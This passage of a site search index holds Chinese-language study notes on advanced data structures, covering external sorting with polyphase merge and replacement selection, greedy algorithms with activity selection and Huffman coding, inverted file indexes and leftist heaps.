<p>\u6211\u4eec\u5c06\u5f52\u5e76\u540e\u7684\u4e00\u6bb5\u6709\u5e8f\u6570\u636e\u79f0\u4e3a\u4e00\u4e2a run \uff0c</p> <p>\u6309\u7167\u8fd9\u79cd\u601d\u60f3\uff0cPass \u64cd\u4f5c\u7684\u6b21\u6570\u4e3a \\(1+\\lceil \\log_2 (N / M) \\rceil\\) </p> <p>Example</p> <ul> <li>Question: Given 10,000,000 records of 128 bytes each, and the size of the internal memory is 4MB.\u00a0 How many passes we have to do?</li> <li>Answer:<ul> <li>\\(M= \\frac{4MB}{128 bytes} =32768,\\ N=10,000,000\\)</li> <li>1+ log(320 runs) = 1 + 9</li> <li>(\u81f3\u5c11ppt\u4e0a\u7b54\u6848\u662f\u8fd9\u6837\u5199\u7684\uff0c\u4f46\u662f\u6211\u611f\u89c9\u5b58\u7591)</li> </ul> </li> </ul> <p>\u56db\u4e2a\u4f18\u5316\u65b9\u6cd5\uff1a</p> <ul> <li>&lt;1&gt; \u51cf\u5c11 Pass</li> <li>&lt;2&gt; \u4f7f\u7528 Buffer \u4f7f\u5176\u80fd\u591f\u5e76\u884c</li> <li>&lt;3&gt; \u589e\u957f Run</li> <li>&lt;4&gt; \u52a0\u5feb Merge</li> </ul>"},{"location":"Courses/DS/ADS/External%20Sort/#1-reduce-number-of-pass","title":"1. Reduce Number of Pass","text":"<p>\u4f7f\u7528 K-Way Merge\uff0c\u5bf9\u5e94\u7684 Pass \u6570\u4e3a \\(1+\\lceil \\log_k (N / M)\\rceil\\) \u3002\u4f46\u662f\u95ee\u9898\u5728\u4e8e\uff0cK-Way \u9700\u8981\u81f3\u5c11 \\(2k\\) \u4e2a Tapes\u3002\u6b63\u5982\u4e0a\u9762\u90a3\u4e2a\u7b80\u5355\u4f8b\u5b50\uff0c\u6211\u4eec\u4f7f\u7528\u4e86 2-Way Merge\uff0c\u90a3\u4e48\u81f3\u5c11\u9700\u8981 4 \u4e2a Tapes\u3002</p> <p>\u90a3\u4e48\u5982\u4f55\u51cf\u5c11\u6240\u9700\u7684\u78c1\u5e26\u6570\u91cf\u5462\uff1f\u6211\u4eec\u53d1\u73b0\uff0c\u5f53\u521d\u59cb\u7684 run \u6570\u91cf\u4e3a\u6590\u6ce2\u90a3\u5951\u6570\u65f6\uff0c\u53ef\u4ee5\u901a\u8fc7 Split Unevenly \u7684\u65b9\u5f0f\uff0c\u4ea4\u66ff\u8fdb\u884c Merge\uff1a</p> <p></p> <p>\u4ee5\u7b2c\u4e00\u6b21 Pass \u4e3a\u4f8b\u5b50\uff0c\\(T_2\\) \u7684\u524d 13 \u4e2a Run \u548c \\(T_3\\) \u7684\u524d 13 \u4e2a Run \u8fdb\u884c Merge \u5e76\u5c06\u65b0\u7684 13 \u4e2a Merge \u5b58\u50a8\u5230 \\(T_1\\) \u4e0a\uff0c\u6b64\u65f6 \\(T_2\\) \u5269\u4f59 8 \u4e2a Run \u4e0d\u8fdb\u884c Merge \u64cd\u4f5c\uff0c\u7136\u540e\u8fdb\u5165\u4e0b\u4e00\u8f6e Pass\u3002</p> <p>\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\uff0c\u6211\u4eec\u53ea\u9700\u8981\u4f7f\u7528 \\(k+1\\) \u4e2a Tapes \u5c31\u80fd\u6ee1\u8db3 K-Way Merge \u7684\u9700\u6c42\uff0cPass \u4e2a\u6570\u6ee1\u8db3 \\(F_{\\#pass}^{(k)} = \\#Run\\) \u3002</p> <p>k\u9636\u6590\u6ce2\u90a3\u5951\u6570</p> \\[F_{0\\sim k-2}^{(k)}=0, F_{k-1}^{(k)} =1, F_N^{(k)} = F_{N-1}^{(k)} +... + F_{N-k}^{(k)}\\] <p>\u5982\u679c\u521d\u59cb Run \u6570\u91cf\u4e0d\u6ee1\u8db3\u6590\u6ce2\u90a3\u5951\u6570\uff0c\u90a3\u4e48\u6dfb\u52a0\u7a7a\u6570\u636e\u76f4\u5230\u6ee1\u8db3\u5373\u53ef</p>"},{"location":"Courses/DS/ADS/External%20Sort/#2-handle-buffers-to-parallel","title":"2. Handle Buffers to Parallel","text":"<p>\u63a5\u4e0b\u6765\u6211\u4eec\u4f7f\u7528\u4e00\u4e2a\u66f4\u63a5\u8fd1\u4e8e\u771f\u5b9e\u5e38\u89c1\u5e94\u7528\u7684\u4f8b\u5b50\uff0c\u5047\u8bbe\u5185\u5b58\u5bb9\u91cf\u4e3a 750 records\uff0cBlock \u5927\u5c0f\u4e3a 250 records\uff0c\u90a3\u4e48\u5185\u5b58\u4e2d\u6700\u591a\u80fd\u5b58\u653e 3 \u4e2a Block\u3002</p> <p>\u5bf9\u4e8e K-Way Merge\uff0c\u6211\u4eec\u9700\u8981\u5c06\u5185\u5b58\u5212\u5206\u4e3a 2k \u4e2a input buffer \u548c 2 \u4e2a output buffer\u3002</p> <p>\u6bcf\u4e2a Buffer \u539f\u5219\u4e0a\u6765\u8bb2\u5e94\u4e3a\u4e00\u4e2a Block \u7684\u5927\u5c0f\u3002\u4f46\u662f\u7531\u4e8e\u5185\u5b58\u5927\u5c0f\u4e00\u5b9a\uff0c\u5f53 K \u8d8a\u5927\u65f6\uff0cBuffer \u6570\u76ee\u53d8\u591a\uff0c\u90a3\u4e48\u5355\u4e2a Buffer \u7684\u5927\u5c0f\u53d8\u5c0f\uff0c\u5bf9\u5e94\u8bfb\u53d6\u6570\u636e\u7684\u57fa\u672c\u5355\u4f4d Block Size \u4e5f\u5c31\u53d8\u5c0f\uff0c\u9020\u6210\u5355\u6b21 Pass \u65f6\u8981\u5904\u7406\u7684 I/O \u5f00\u9500\u589e\u52a0\u3002</p> <p>\u56e0\u6b64\uff0c\u8981\u6743\u8861 K \u503c\u589e\u52a0\u5e26\u6765\u7684 Pass \u51cf\u5c11\u4e0e I/O \u5f00\u9500\u589e\u52a0\u5e26\u6765\u7684\u5f71\u54cd\u3002\u8fd9\u5c06\u89c6\u5b9e\u9645\u4f7f\u7528\u7684\u786c\u76d8\u548c\u5185\u5b58\u53c2\u6570\u51b3\u5b9a\u3002</p> <p></p>"},{"location":"Courses/DS/ADS/External%20Sort/#3-generate-a-longer-run","title":"3. Generate a longer Run","text":"<p>\u672c\u8282\u7ee7\u7eed\u4f7f\u7528\u7b2c\u4e00\u8282\u7684 Simple Example\uff0c\u5373\u5185\u5b58\u5bb9\u91cf\u4e3a 3 records\u3002\u4f46\u662f\u4e0e\u4e4b\u524d\u6bcf\u4e2a Run \u5927\u5c0f\u4e0a\u9650\u4e3a\u5185\u5b58\u5927\u5c0f \\(M\\) \u4e0d\u540c\uff0c\u6211\u4eec\u5c06\u5185\u5b58\u6539\u9020\u6210\u4e00\u4e2a min-heap\uff0c\u6309\u7167\u5982\u4e0b\u903b\u8f91\u6784\u9020 Run\uff1a</p> <ul> <li>&lt;1&gt; \u521d\u59cb\u5316: \u8bfb\u53d6\u5185\u5b58\u5bb9\u91cf\u5927\u5c0f\u4e2a\u6570\u636e\uff0c\u5e76\u5c06\u5176\u6784\u9020\u6210 min-heap</li> <li>&lt;2&gt; \u5faa\u73afPOP: pop\u6700\u5c0f\u503c\u5e76\u7f6e\u5165 Run \u4e2d\uff0c\u8bfb\u53d6\u4e0b\u4e00\u4e2a\u6570\u636e\uff0c\u5faa\u73af\u64cd\u4f5c<ul> <li>\u5982\u679c\u4e0b\u4e00\u4e2a\u6570\u636e\u6bd4\u5f53\u524d Run \u6700\u540e\u4e00\u4e2a\u6570\u636e\u5927\uff0c\u5219\u6b63\u5e38\u538b\u5165\u6700\u5c0f\u5806</li> <li>\u5426\u5219\uff0c\u5c06\u5176\u7f6e\u4e8e\u5806\u5e95\u90e8\uff0c\u4e0d\u518d\u79fb\u52a8\uff0c\u8bb0\u4e3a\u6b7b\u70b9</li> </ul> </li> <li>&lt;3&gt; \u6e05\u7a7a\u5806: \u5f53\u6700\u5c0f\u5806\u5168\u662f\u6b7b\u70b9\u65f6\uff0c\u7ed3\u675f\u5f53\u524d Run \u7684\u7f6e\u5165\uff0c\u5e76\u6e05\u7a7a\u5806\u56de\u5230\u6b65\u9aa4\u4e00</li> </ul> <p></p> <p>81, 94, 11, 96, 12, 35, 17, 99, 28, 58, 41, 75, 15</p> <p>\u6700\u7ec8\u5f97\u5230\u4e00\u4e2a\u5e73\u5747\u957f\u5ea6\u4e3a\u539f\u6765\u4e24\u500d\u7684 Run \u5e8f\u5217\u3002\u5982\u679c\u539f\u6765\u7684\u6570\u636e\u672c\u6765\u5df2\u7ecf\u8fd1\u4f3c\u6392\u5b8c\u5e8f\u4e86\uff0c\u90a3\u4e48\u8fd9\u4e2a\u7b56\u7565\u7684\u4f18\u5316\u6548\u679c\u4f1a\u66f4\u52a0\u660e\u663e\u3002</p> <p>\u81ea\u5df1\u8bd5\u4e00\u4e0b\u8fd9\u4e2a\u5e8f\u5217\uff0c\u6700\u7ec8\u80fd\u5f97\u5230\u4e24\u4e2a Initial Run</p> <p>25, 74, 56, 34, 21, 11, 29, 80, 38, 53</p>"},{"location":"Courses/DS/ADS/External%20Sort/#4-minimize-the-merge-time","title":"4. Minimize the Merge Time","text":"<p>\u63a5\u7eed\u4e0a\u4e00\u8282\u5185\u5bb9\uff0c\u5728\u6211\u4eec\u4f7f\u7528\u6700\u5c0f\u5806\u751f\u6210 Run \u65f6\uff0c\u6bcf\u4e2a Run \u7684\u5927\u5c0f\u957f\u5ea6\u53d8\u5f97\u4e0d\u4e00\u81f4\uff0c\u90a3\u4e48\u6211\u4eec\u8be5\u5982\u4f55\u5b89\u6392\u4f7f\u5f97 Merge Time \u6700\u5c0f\u5316\u5462\uff1f</p> <p>\u7b54\u6848\u662f\u54c8\u592b\u66fc\u6811\uff01\u6211\u4eec\u5e0c\u671b\u8d8a\u957f\u7684 Run \u8d8a\u665a\u88ab Merge\uff0c\u5373\u5b83\u7684 Depth \u8d8a\u5c0f\u3002</p> <p>\u5bf9\u4e8e\u56db\u4e2a\u957f\u5ea6\u5206\u522b\u4e3a 2,4,5,15 \u7684 Run\uff0c\u6211\u4eec\u5bf9\u6bd4\u4ee5\u4e0b\u4e24\u79cd\u5408\u5e76\u987a\u5e8f\u7684\u5f00\u9500\u5dee\u5f02\uff1a</p> <p></p> \\[ \\text{Total merge time} =O(\\text{the weighted external path length}) \\] <p>External Path Length</p> <p>\u5373\u6839\u5230\u53f6\u8282\u70b9\u7684\u8def\u5f84\u957f\u5ea6\uff0c\u5982\u4e0a\u9762\u7684\u54c8\u592b\u66fc\u6811\u603b\u5408\u5e76\u65f6\u95f4\u7684\u8ba1\u7b97\u5e94\u8be5\u4e3a 2*3+4*3+5*2+15*1 = 43</p>"},{"location":"Courses/DS/ADS/Greedy%20Algorithm/","title":"Greedy Algorithm","text":""},{"location":"Courses/DS/ADS/Greedy%20Algorithm/#greedy-algorithm","title":"Greedy Algorithm","text":"<p> \u7ea6 478 \u4e2a\u5b57  39 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 3 \u5206\u949f</p> <p>\u8d2a\u5fc3\u7b97\u6cd5\u5728\u6bcf\u4e2a\u51b3\u7b56\u9636\u6bb5\u9009\u62e9\u5f53\u524d\u9636\u6bb5\u53ef\u884c\u7684\u6700\u4f18\u89e3\u3002\u5176\u6838\u5fc3\u601d\u60f3\u5728\u4e8e\u901a\u8fc7\u5c40\u90e8\u6700\u4f18\u9009\u62e9\u8fbe\u6210\u5168\u5c40\u6700\u4f18\uff0c\u4f46\u662f\u8d2a\u5fc3\u7b97\u6cd5\u5e76\u4e0d\u80fd\u4fdd\u8bc1\u5168\u5c40\u6700\u4f18\u6027\u3002</p> <p>Greedy algorithm works only if the local optimum is equal to the global optimum</p>"},{"location":"Courses/DS/ADS/Greedy%20Algorithm/#activity-selection-problem","title":"\u7ecf\u5178\u6848\u4f8b\uff1aActivity Selection Problem","text":"<p>\u6709\u4e00\u4e2a\u540c\u65f6\u6bb5\u53ea\u80fd\u4e3e\u529e\u4e00\u573a\u6d3b\u52a8\u7684\u6d3b\u52a8\u573a\u5730\uff0c\u5728\u8be5\u573a\u5730\u5b89\u6392\u4e00\u7ec4\u6d3b\u52a8 \\(S=\\{a_1, a_2, a_3,..., a_n\\}\\) \uff0c\u6bcf\u4e2a\u6d3b\u52a8\u8d77\u59cb\u7ed3\u675f\u65f6\u95f4\u4e3a \\([s_i, f_i)\\) \uff0c\u5e76\u4e14\u4e24\u4e2a\u6d3b\u52a8\u4e4b\u95f4\u4e0d\u80fd\u6709\u4ea4\u53c9\u3002\u8981\u6c42\u5728\u8be5\u6d3b\u52a8\u573a\u5730\u4e2d\u7ed9\u51fa\u6700\u591a\u80fd\u4e3e\u529e\u7684\u6d3b\u52a8\u6570\u3002</p> <p>\u5bf9\u4e8e\u8be5\u95ee\u9898\uff0c\u8d2a\u5fc3\u7b97\u6cd5\u7684\u539f\u5219\u662f\u5c40\u90e8\u51b3\u7b56\u9009\u53d6\u7ed3\u675f\u65f6\u95f4\u6700\u65e9\u3001\u4e14\u4e0e\u76ee\u524d\u5df2\u786e\u5b9a\u4e3e\u529e\u7684\u6d3b\u52a8\u65e0\u65f6\u95f4\u51b2\u7a81\u7684\u6d3b\u52a8\u3002</p> <p>\u56e0\u6b64\uff0c\u5bf9\u4e8e\u8d2a\u5fc3\u7b97\u6cd5\uff0c\u6211\u4eec\u4ec5\u9700\u8981\u5bf9\u6d3b\u52a8\u6309\u7167\u7ed3\u675f\u65f6\u95f4\u8fdb\u884c\u6392\u5e8f\uff0c\u518d\u5bf9\u5176\u8fdb\u884c\u4e00\u6b21\u904d\u5386\u5373\u53ef\u5f97\u5230\u7ed3\u679c\u3002\u5176\u4e2d\uff0c\u6392\u5e8f\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(O(N\\log N)\\) \uff0c\u904d\u5386\u4ec5\u9700 \\(O(N)\\) \uff0c\u603b\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(O(N\\log N)\\)\u3002</p> <pre><code>Recursive_activity_selector(s, f, k, n)\n{\n    m = k + 1;\n    while (m &lt;= n &amp;&amp; s[m] &lt; f[k])\n        ++m;\n    if (m &lt;= n)\n        return {a_m} \u222a Recursive_activity_selector(s,f,m,n);\n    else\n        return {\u2205};\n}\n\nsort(s,f,n); // sort by f\nRecursive_activity_selector(s,f,0,n);\n\n---\n\nIterative_activity_seletor(s, f)\n{\n    n = s.length();\n    A = {a_1};\n    k = 1;\n    for(m = 2;m &lt; n;++m)\n        if (s[m] &gt;= f[k]){\n            A = A \u222a {a_m};\n            k = m;\n        }\n    return A;\n}\n</code></pre> <p>\u4f7f\u7528 DP \u7b97\u6cd5\uff0c\u5219\u9700\u8981 \\(O(N^2)\\) \u65f6\u95f4\u590d\u6742\u5ea6</p> <p>\u6b63\u786e\u6027\u8bc1\u660e\uff1a</p> <ul> <li>&lt;1&gt; \u6bcf\u4e00\u6b65\u51b3\u7b56\u662f\u53ef\u884c\u7684</li> <li>&lt;2&gt; \u7ed3\u679c\u662f\u6700\u4f18\u7684</li> </ul>"},{"location":"Courses/DS/ADS/Greedy%20Algorithm/#_1","title":"\u7ecf\u5178\u6848\u4f8b\uff1a\u54c8\u592b\u66fc\u7f16\u7801","text":"<p>\u6784\u9020\u4e00\u4e2a\u4f18\u5148\u961f\u5217\uff0c\u6bcf\u6b21\u64cd\u4f5c\u53d6\u51fa\u4e24\u4e2a\u6839\u503c\u6700\u5c0f\u7684\u8282\u70b9\u5408\u5e76\uff0c\u65b0\u6839\u503c\u4e3a\u4e8c\u8005\u4e4b\u540e\uff0c\u7136\u540e\u518d\u5165\u961f\u3002\u91cd\u590d\u64cd\u4f5c\uff0c\u76f4\u5230\u961f\u5217\u53ea\u5269\u4e00\u4e2a\u8282\u70b9\uff0c\u6240\u5f97\u7684\u6811\u5373\u4e3a\u54c8\u592b\u66fc\u7f16\u7801\u6811\u3002</p> <pre><code>void Huffman(PriorityQueue heap[] = C)\n{\n    n = |C|;\n    for i = 1 to n - 1:\n        allocate a new node z;\n        z.left = x = ExtractMin(C);\n        z.right = y = ExtractMin(C);\n        z.freq = x.freq + y.freq;\n        Insert(z);\n    return ExtractMin(C);\n}\n</code></pre> <p>\u6b63\u786e\u6027\u8bc1\u660e\u600e\u4e48\u529e\u5462\ud83e\udd7a</p> <p>\u6839\u636e\u4e0a\u8ff0\u6784\u5efa\u8fc7\u7a0b\uff0c\u6211\u4eec\u77e5\u9053 Huffman Tree \u4e2d\u662f\u4e0d\u5b58\u5728\u5ea6\u4e3a 1 \u7684\u8282\u70b9\u7684(Full Tree)\u3002\u7531\u4e8e\u5bf9\u4e8e\u4efb\u4f55\u6811\uff0c\u90fd\u5b58\u5728 \\(n_2= n_0 -1\\)\uff0c\u54c8\u592b\u66fc\u6811\u7684\u603b\u8282\u70b9\u6570\u91cf \\(size\\) \u4e0e\u5176\u7f16\u7801\u7684\u5b57\u7b26\u6570\u91cf \\(n\\) \u6709\u5982\u4e0b\u5173\u7cfb\uff1a</p> \\[ \\text{size} = 2n-1 \\]"},{"location":"Courses/DS/ADS/Inverted%20File%20Index/","title":"Inverted File Index","text":""},{"location":"Courses/DS/ADS/Inverted%20File%20Index/#_1","title":"\u5012\u6392\u6587\u4ef6\u7d22\u5f15","text":"<p> \u7ea6 651 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 3 \u5206\u949f</p>"},{"location":"Courses/DS/ADS/Inverted%20File%20Index/#definition","title":"Definition","text":"<p>\u4e00\u4e2a Inverted File Index \u7684\u4f8b\u5b50\u5982\u4e0b\uff1a</p> <p></p> <p>\u5b83\u4ee5\u6587\u7ae0\u4e2d\u51fa\u73b0\u7684 Term \u4f5c\u4e3a\u952e\u503c\uff0c\u4ee5\u94fe\u8868(?)\u7684\u5f62\u5f0f\u8fde\u63a5\u5404\u4e2a\u4fdd\u5b58\u8be5 Term \u51fa\u73b0\u4fe1\u606f\u7684\u8282\u70b9\u3002\u4ee5\u5355\u8bcd silver \u4e3a\u4f8b\uff0c<code>&lt;2;(1;2),(3;3,7)&gt;</code> \u6700\u524d\u9762\u7684 2 \u4ee3\u8868\u603b\u5171\u5728\u4e24\u7bc7\u6587\u7ae0\u4e2d\u51fa\u73b0\u8fc7\uff0c\u62ec\u53f7 <code>(3;3,7)</code> \u4e2d\uff0c\u5206\u53f7\u524d\u7684 3 \u662f Document \u7684\u6807\u53f7\uff0c\u540e\u9762\u7684 3 \u548c 7 \u662f\u8be5 Term \u5728\u6587\u7ae0\u4e2d\u51fa\u73b0\u7684\u4f4d\u7f6e\u3002</p> <p>\u5176\u4e2d\uff0c\u7d22\u5f15\u751f\u6210\u90e8\u5206\u53ef\u4ee5\u5199\u6210\u5982\u4e0b\u4f2a\u4ee3\u7801\uff1a</p> <p></p>"},{"location":"Courses/DS/ADS/Inverted%20File%20Index/#term","title":"\u63d0\u53d6 Term","text":"<p>\u5f53\u8bfb\u53d6\u6587\u7ae0\u4e2d\u7684 Term \u7528\u4f5c\u7d22\u5f15\u65f6\uff0c\u8fd8\u9700\u8981\uff1a</p> <ul> <li>Word Stemming<ul> <li>\u63d0\u53d6\u8be5 Term \u7684\u8bcd\u6839\uff0c\u5982 says,said,saying \u90fd\u770b\u4f5c\u8bcd\u6839 say</li> <li>https://tartarus.org/martin/PorterStemmer/</li> <li>https://github.com/wooorm/stmr.c</li> </ul> </li> <li>Stop Words<ul> <li>\u4e00\u4e9b Term \u592a\u8fc7\u5e38\u89c1\uff0c\u6ca1\u6709\u4ef7\u503c\uff0c\u6240\u4ee5\u9700\u8981\u8fc7\u6ee4\u5b83\u4eec</li> <li>\u641c\u7d22 Word Stop List \u5373\u53ef\u627e\u5230\u8fc7\u6ee4\u5217\u8868</li> </ul> </li> </ul>"},{"location":"Courses/DS/ADS/Inverted%20File%20Index/#term_1","title":"\u5b58\u50a8 Term","text":"<p>\u5b58\u50a8 Term \u7684\u6570\u636e\u7ed3\u6784\u6309\u7167\u9700\u6c42\u4e00\u822c\u9009\u7528 Search Tree \u6216 Hashing</p> <ul> <li>Hashing<ul> <li>\u7406\u60f3\u60c5\u51b5\u4e0b\uff0chashing\u7684\u5355\u4e2a\u67e5\u8be2\u66f4\u5feb</li> <li>Hashing\u7684\u95ee\u9898\u5728\u4e8e\u51b2\u7a81\u4ee5\u53ca\u4e0d\u652f\u6301\u5feb\u901f\u7684\u8303\u56f4\u67e5\u8be2\u3002\u6bd4\u5982\u8981\u67e5\u627e\u4e00\u5806re\u5f00\u5934\u7684\u5355\u8bcd\uff0c\u4f1a\u9700\u8981\u4e00\u4e2a\u4e2a\u7b97\u54c8\u5e0c\u503c\u3002</li> </ul> </li> <li>\u5b57\u5178\u6811 Tries<ul> <li>\u6bcf\u4e2a\u53f6\u8282\u70b9\u90fd\u4ee3\u8868\u4e00\u4e2aTerm</li> <li>\u82e5\u5355\u8bcd\u6709\u76f8\u540c\u524d\u7f00\uff0c\u5219\u4f1a\u7ecf\u8fc7\u76f8\u540c\u7236\u8282\u70b9</li> <li>\u590d\u6742\u5ea6\u5c31\u662f\u5355\u8bcd\u7684\u957f\u5ea6</li> </ul> </li> </ul> <p></p> <p>\u5f53\u6211\u4eec\u5185\u5b58\u4e0d\u8db3\u4ee5\u653e\u4e0b\u6240\u6709\u7d22\u5f15\u65f6\uff0c\u53ef\u4ee5\u91c7\u7528\u5982\u4e0b\u51e0\u79cd\u65b9\u5f0f\u89e3\u51b3\uff1a</p>"},{"location":"Courses/DS/ADS/Inverted%20File%20Index/#lru","title":"LRU","text":""},{"location":"Courses/DS/ADS/Inverted%20File%20Index/#distributed-indexing","title":"Distributed indexing","text":"<p>\u5728\u591a\u53f0\u673a\u5668\u4e0a\uff0c\u6309\u7167\u4e00\u5b9a\u89c4\u5219\u8fdb\u884c\u5206\u5e03\u5f0f\u5b58\u50a8</p> <p></p> <ul> <li>\u7b2c\u4e00\u79cd\u5b58\u50a8\u5f88\u590d\u6742\uff0c\u4f46\u662f\u68c0\u7d22\u65b9\u4fbf</li> <li>\u7b2c\u4e8c\u79cd\u5b58\u50a8\u65b9\u4fbf\uff0c\u4f46\u662f\u68c0\u7d22\u5f88\u590d\u6742<ul> <li>\u4e00\u822c\u91c7\u53d6 Solution 2\uff0c\u5f53\u4e00\u4e2a\u8bbe\u5907\u635f\u574f\u65f6\uff0c\u4e0d\u4f1a\u5bfc\u81f4\u67d0\u4e2a\u5b57\u6bcd\u6bb5\u6570\u636e\u5168\u90e8\u4e22\u5931</li> </ul> </li> </ul>"},{"location":"Courses/DS/ADS/Inverted%20File%20Index/#dynamic-indexing","title":"Dynamic indexing","text":"<p>\u5c06 index \u5206\u4e3a Main Index(\u5feb\u8bfb\u6162\u5199) \u548c Auxiliary Index(\u6162\u8bfb\u5feb\u5199)\u3002\u6bcf\u5f53\u6709\u65b0\u6587\u6863\u51fa\u73b0\u65f6\u5148\u5c06\u5176\u4ea7\u751f\u7684 index \u5199\u5165 Auxiliary Index \u4e2d\u3002\u4ee5\u4e00\u5b9a\u5468\u671f(\u5982\u4e00\u5929)\u7edf\u4e00\u5730\u5c06 Auxiliary Index \u5199\u5165 Main Index \u4e2d\u3002</p> <p>\u4f46\u662f\u641c\u7d22 Index \u7684\u65f6\u5019\u8981\u540c\u65f6\u641c\u7d22 Main Index \u548c Auxiliary Index\u3002</p> <p></p>"},{"location":"Courses/DS/ADS/Inverted%20File%20Index/#compression","title":"Compression","text":"<p>\u538b\u7f29\u8282\u70b9\u5b58\u50a8\u7684\u6570\u636e\u3002\u5982\u4e0d\u76f4\u63a5\u6307\u5411 Document \u7684\u7f16\u53f7\uff0c\u800c\u662f\u5b58\u50a8\u8be5 Document \u7f16\u53f7\u4e0e\u4e0a\u4e00\u4e2a Document \u7684\u5dee\u503c</p> <p></p>"},{"location":"Courses/DS/ADS/Inverted%20File%20Index/#measure-of-search-engine","title":"Measure of Search Engine","text":"<ul> <li>\u7cbe\u786e\u7387 \u662f\u68c0\u7d22\u5230\u7684\u76f8\u5173\u8bb0\u5f55\u4e0e\u68c0\u7d22\u5230\u7684\u8bb0\u5f55\u603b\u6570\u7684\u6bd4\u7387\u3002</li> <li>\u53ec\u56de\u7387 \u662f\u68c0\u7d22\u5230\u7684\u76f8\u5173\u8bb0\u5f55\u4e0e\u76f8\u5173\u8bb0\u5f55\u603b\u6570\u7684\u6bd4\u503c\u3002</li> </ul> <p>\u4e24\u4e2a\u6307\u6807\u5f80\u5f80\u662f\u4e0d\u53ef\u517c\u5f97\u7684\uff0c\u56e0\u6b64\u8981\u6c42\u641c\u7d22\u5f15\u64ce\u8bbe\u8ba1\u8005\u8861\u91cf\u4e8c\u8005\u5bf9\u7528\u6237\u4f53\u9a8c\u7684\u4f5c\u7528</p> <p></p> <p>\u590d\u4e60\u7684\u65f6\u5019\u91cd\u65b0\u770b\u4e00\u904dHW3\uff0c\u592a\u795e\u7ecf\u4e86</p>"},{"location":"Courses/DS/ADS/Leftist%20Heap%20%26%20Skew%20Heap/","title":"Leftist Heap & Skew Heap","text":"<p> \u7ea6 1151 \u4e2a\u5b57  42 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 6 \u5206\u949f</p>"},{"location":"Courses/DS/ADS/Leftist%20Heap%20%26%20Skew%20Heap/#leftist-heap","title":"Leftist Heap","text":""},{"location":"Courses/DS/ADS/Leftist%20Heap%20%26%20Skew%20Heap/#definition","title":"Definition","text":"<p>\u5de6\u504f\u5806\uff0c\u4ea6\u79f0\u5de6\u504f\u6811\uff08Leftist Tree\uff09\uff0c\u662f\u4e00\u79cd\u7528\u4e8e\u5b9e\u73b0\u4f18\u5148\u7ea7\u961f\u5217\u7684 Binary Heap \u6570\u636e\u7ed3\u6784\uff0c\u5b83\u5177\u6709\u548c\u5806\u4e00\u6837\u7684\u5927\u5c0f\u987a\u5e8f\uff0c\u4f46\u8868\u73b0\u5f62\u5f0f\u4e3a\u975e\u5e73\u8861\u4e8c\u53c9\u6811\uff0c\u56e0\u6b64\u4e0d\u80fd\u4f7f\u7528\u6570\u7ec4\u8868\u793a\u548c\u7ef4\u62a4\u3002</p> <p>\u5de6\u504f\u5806\u7684\u5173\u952e\u7279\u5f81\u4e4b\u4e00\u662f\u8ba1\u7b97\u548c\u7ef4\u62a4\u6bcf\u4e2a\u8282\u70b9\u7684 Null Path Length \uff0c\u8be5\u957f\u5ea6\u5b9a\u4e49\u4e3a\u4ece\u8282\u70b9 X \u5230\u6700\u8fd1\u7684 Null \u8282\u70b9\u7684\u8ddd\u79bb\uff0c\u5728\u7a0b\u5e8f\u7ed3\u6784\u4e2d\u901a\u5e38\u4f7f\u7528 <code>dist(X)</code> \u6216 <code>Npl(X)</code> \u8868\u793a</p> <ul> <li>\u5b9a\u4e49 <code>Npl(NULL) = -1</code>\uff0c\u5982\u679c\u4e00\u4e2a\u8282\u70b9\u6709 Null \u5b50\u8282\u70b9\uff0c\u5219\u5176 Npl \u4e3a 0</li> <li><code>Npl(X) = Min{Npl(Left Child),Npl(Right Child)}+1</code></li> </ul> <p>\u5bf9\u4e8e\u5de6\u504f\u5806\u4efb\u4e00\u8282\u70b9\uff0c\u90fd\u6709 \\(Npl(Left\\ Child)\\ge Npl(Right\\ Child)\\) \uff0c\u5e76\u80fd\u5f97\u5230\u4ee5\u4e0b\u5b9a\u7406\uff1a</p> <ul> <li>&lt;1&gt; \u4ece\u6839\u5230\u6700\u53f3\u4fa7\u53f6\u7684\u8def\u5f84\u662f\u4ece\u6839\u5230\u53f6\u7684\u6700\u77ed\u8ddd\u79bb\uff08\u8fd9\u91cc\u91c7\u7528\u62d3\u5c55\u4e8c\u53c9\u6811\u7684\u5f62\u5f0f\uff0c\u5373\u53f6\u8282\u70b9\u4e3a Null \u8282\u70b9\uff09</li> <li>&lt;2&gt; \u5982\u679c\u5230\u6700\u53f3\u4fa7\u8def\u5f84\u4e0a\u6709 \\(r\\) \u4e2a\u8282\u70b9\uff0c\u5219\u5de6\u504f\u5806\u8d77\u7801\u6709 \\(2^r-1\\) \u4e2a\u8282\u70b9\uff0c\u8fd9\u4e5f\u610f\u5473\u7740\u5bf9\u4e8e\u5177\u6709 \\(N\\) \u4e2a\u8282\u70b9\u7684\u5de6\u504f\u5806\uff0c\u5230\u6700\u53f3\u4fa7\u53f6\u8282\u70b9\u7684\u8def\u5f84\u957f\u5ea6\u4e3a \\(O(\\log N)\\)</li> </ul> <p>\u8def\u5f84\u957f\u5ea6\u53d7\u9650\u662f\u51cf\u5c11\u7ef4\u62a4\u4ee3\u4ef7\u7684\u57fa\u7840</p> <p>\u6839\u636e\u4ee5\u4e0a\u5b9a\u4e49\uff0c\u5de6\u504f\u5806\u7684\u58f0\u660e\u901a\u5e38\u5982\u4e0b\uff1a</p> <pre><code>typedef struct node {\n    ElementType Val;\n    struct node *left;\n    struct node *right;\n    int Npl; // or Dist\n} Node;\n</code></pre>"},{"location":"Courses/DS/ADS/Leftist%20Heap%20%26%20Skew%20Heap/#operation","title":"Operation","text":"<p>\u5bf9\u5de6\u504f\u5806\u7684\u64cd\u4f5c\u4e3b\u8981\u662f Merge \uff0c\u5176\u5b83\u64cd\u4f5c\u90fd\u53ef\u4ee5\u901a\u8fc7 Merge \u6765\u8c03\u6574\u3002</p> <ul> <li><code>DeleteMin()</code> \u6216 <code>ExtractMin</code> \u53ef\u4ee5\u901a\u8fc7\u5220\u9664 root \u5e76\u4e3a\u5de6\u53f3\u5b50\u6811\u8c03\u7528 Merge \u6765\u5b8c\u6210</li> <li><code>Insert()</code> \u53ef\u4ee5\u901a\u8fc7 Merge 